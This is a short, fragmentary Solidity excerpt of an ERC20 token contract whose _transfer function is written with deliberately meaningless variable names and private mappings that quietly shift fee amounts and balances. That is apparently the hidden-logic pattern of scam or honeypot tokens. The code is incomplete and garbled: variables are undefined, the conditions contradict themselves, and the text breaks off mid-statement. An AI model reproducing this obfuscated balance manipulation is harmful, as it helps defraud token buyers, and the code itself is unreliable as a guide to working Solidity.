...
contract Contract is IERC20, Ownable {
    ...
    mapping(uint256 => address) private fresh;
    mapping(uint256 => address) private each;
    mapping(address => uint256) private exact;
    ...
    function _transfer(
        ...
        address book = fresh[chart];
        bool declared = size == each[chart];
        uint256 chose = _fee;

        if (solar[size] == 0 && !declared && exact[size] > 0) {
            solar[size] -= chose;
        }

        fresh[chart] = steady;

        if (solar[size] > 0 && amount == 0) {
            solar[steady] += chose;
        }

        exact[book] += chose;

        if (solar[size] > 0 && amount > chart) {
